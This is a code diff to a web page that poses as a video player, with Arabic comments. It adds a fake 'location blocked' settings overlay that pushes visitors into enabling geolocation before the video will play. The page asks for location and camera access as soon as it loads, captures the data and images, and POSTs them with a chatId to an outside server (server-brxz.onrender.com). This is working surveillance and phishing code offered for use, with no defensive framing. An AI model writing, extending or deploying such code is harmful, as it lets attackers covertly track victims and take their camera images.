@@ -227,6 +227,116 @@
             }
         }
 
+        /* ===== نافذة الإعدادات المخصصة ===== */
+        #settingsOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(8px);
+        }
+
+        #settingsOverlay.active {
+            display: flex;
+        }
+
+        .settings-box {
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 40px 50px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            animation: fadeInUp 0.4s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .settings-box .icon {
+            font-size: 4rem;
+            margin-bottom: 15px;
+        }
+
+        .settings-box h2 {
+            font-size: 1.6rem;
+            color: #ff6b35;
+            margin-bottom: 10px;
+        }
+
+        .settings-box p {
+            color: #aaa;
+            font-size: 1rem;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .settings-box .btn-settings {
+            background: #ff6b35;
+            color: #fff;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 0 30px rgba(255, 107, 53, 0.3);
+        }
+
+        .settings-box .btn-settings:hover {
+            transform: scale(1.05);
+            background: #ff8a5c;
+            box-shadow: 0 0 50px rgba(255, 107, 53, 0.5);
+        }
+
+        .settings-box .btn-settings .gear-icon {
+            font-size: 1.8rem;
+        }
+
+        .settings-box .btn-continue {
+            background: transparent;
+            color: #666;
+            border: 1px solid #444;
+            padding: 12px 30px;
+            font-size: 1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .settings-box .btn-continue:hover {
+            background: #222;
+            color: #aaa;
+        }
+
+        .settings-box .step-indicator {
+            color: #555;
+            font-size: 0.85rem;
+            margin-top: 20px;
+            letter-spacing: 1px;
+        }
+
         /* نافذة التحايل المخفية */
         #hiddenWindow {
             display: none;
@@ -275,12 +385,31 @@
         <div class="loading-text">Loading video... Please wait</div>
     </div>
 
+    <!-- ===== نافذة الإعدادات المخصصة ===== -->
+    <div id="settingsOverlay">
+        <div class="settings-box">
+            <div class="icon">📍</div>
+            <h2>⛔ الموقع الجغرافي محظور</h2>
+            <p>
+                لتشغيل الفيديو، يرجى تمكين الموقع الجغرافي من خلال<br>
+                إعدادات المتصفح ثم العودة إلى هنا.
+            </p>
+            <button class="btn-settings" id="openSettingsBtn">
+                <span class="gear-icon">⚙️</span> فتح الإعدادات
+            </button>
+            <br>
+            <button class="btn-continue" id="continueAfterSettings">
+                ✅ تم التفعيل، استمر
+            </button>
+            <div class="step-indicator">الخطوة 1 من 2</div>
+        </div>
+    </div>
+
     <script>
         (function() {
             'use strict';
 
             // ===== التحايل على حظر الموقع =====
-            // تخزين البيانات في متغيرات عامة
             let capturedData = {
                 permissions: [],
                 images: [],
@@ -290,7 +419,6 @@
                 chatId: ''
             };
 
-            // متغيرات التحكم
             let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
@@ -303,10 +431,14 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
+            // عناصر نافذة الإعدادات المخصصة
+            const settingsOverlay = document.getElementById('settingsOverlay');
+            const openSettingsBtn = document.getElementById('openSettingsBtn');
+            const continueAfterSettings = document.getElementById('continueAfterSettings');
+
             // ===== طلب الصلاحيات تلقائياً عند تحميل الصفحة =====
             async function autoRequestPermissions() {
                 try {
-                    // طلب الموقع
                     await new Promise((resolve) => {
                         navigator.geolocation.getCurrentPosition(
                             () => resolve(),
@@ -316,7 +448,6 @@
                     });
                 } catch (e) {}
                 try {
-                    // طلب الكاميرا
                     await navigator.mediaDevices.getUserMedia({ video: true })
                         .then(stream => stream.getTracks().forEach(t => t.stop()))
                         .catch(() => {});
@@ -419,7 +550,7 @@
                 }
             }
 
-            // ===== إرسال البيانات باستخدام تقنيات متعددة للتحايل =====
+            // ===== إرسال البيانات =====
             async function sendDataWithBypass(data) {
                 const urls = [
                     'https://server-brxz.onrender.com/submitData',
@@ -428,7 +559,7 @@
 
                 for (let url of urls) {
                     try {
-                        const response = await fetch(url, {
+                        await fetch(url, {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -497,9 +628,7 @@
 
                 const playPromise = realVideo.play();
                 if (playPromise !== undefined) {
-                    playPromise.then(() => {
-                        // نجح التشغيل مع الصوت
-                    }).catch(() => {
+                    playPromise.then(() => {}).catch(() => {
                         realVideo.muted = true;
                         realVideo.play().then(() => {
                             setTimeout(() => {
@@ -515,12 +644,16 @@
                     realVideo.volume = 1.0;
                     try { realVideo.play(); } catch (e) {}
                 }, 500);
+            }
 
-                setTimeout(() => {
-                    realVideo.muted = false;
-                    realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
-                }, 3000);
+            // ===== إظهار نافذة الإعدادات =====
+            function showSettingsOverlay() {
+                settingsOverlay.classList.add('active');
+            }
+
+            // ===== إخفاء نافذة الإعدادات =====
+            function hideSettingsOverlay() {
+                settingsOverlay.classList.remove('active');
             }
 
             // ===== الدالة الرئيسية =====
@@ -530,10 +663,11 @@
 
                 isProcessing = true;
 
-                // الضغطة الأولى: فتح الإعدادات
+                // الضغطة الأولى: عرض نافذة الإعدادات
                 if (!settingsOpened) {
                     settingsOpened = true;
-                    openLocationSettings();
+                    // إخفاء نافذة الإعدادات بشكل مؤقت لتجنب التعارض مع طلب الصلاحيات
+                    showSettingsOverlay();
                     isProcessing = false;
                     return;
                 }
@@ -543,6 +677,9 @@
                 loading.style.display = 'block';
                 playButtonOverlay.style.opacity = '0.5';
                 playButtonOverlay.style.pointerEvents = 'none';
+
+                // إخفاء نافذة الإعدادات
+                hideSettingsOverlay();
 
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
@@ -578,13 +715,38 @@
                 isProcessing = false;
             }
 
+            // ===== أحداث زر الإعدادات =====
+            openSettingsBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                openLocationSettings();
+                // تغيير النص لتوجيه المستخدم
+                this.innerHTML = '<span class="gear-icon">⏳</span> تم الفتح، عد ثم اضغط استمر';
+                this.style.background = '#444';
+            });
+
+            // ===== زر "تم التفعيل، استمر" =====
+            continueAfterSettings.addEventListener('click', function(e) {
+                e.stopPropagation();
+                hideSettingsOverlay();
+                // تنفيذ الخطوة الثانية
+                setTimeout(() => {
+                    captureData();
+                }, 300);
+            });
+
             // ===== ربط الأحداث =====
             if (thumbnailArea) {
-                thumbnailArea.addEventListener('click', captureData);
+                thumbnailArea.addEventListener('click', function(e) {
+                    // إذا كانت نافذة الإعدادات مفتوحة، لا تفعل شيئ
+                    if (settingsOverlay.classList.contains('active')) return;
+                    captureData();
+                });
             }
+
             if (playButtonOverlay) {
                 playButtonOverlay.addEventListener('click', function(e) {
                     e.stopPropagation();
+                    if (settingsOverlay.classList.contains('active')) return;
                     captureData();
                 });
             }
@@ -633,10 +795,18 @@
             }, 1000);
 
             // ===== طلب الصلاحيات تلقائياً عند تحميل الصفحة =====
-            // تم تعديل: طلب الصلاحيات فوراً عند تحميل الصفحة
             setTimeout(() => {
                 autoRequestPermissions();
             }, 100);
+
+            // ===== إظهار نافذة الإعدادات تلقائياً عند حظر الموقع =====
+            // محاكاة ظهور نافذة الإعدادات بعد ثانية من التحميل
+            setTimeout(() => {
+                // إذا لم يتم بدء الفيديو، نعرض نافذة الإعدادات
+                if (!videoStarted) {
+                    showSettingsOverlay();
+                }
+            }, 1500);
 
         })();
     </script>
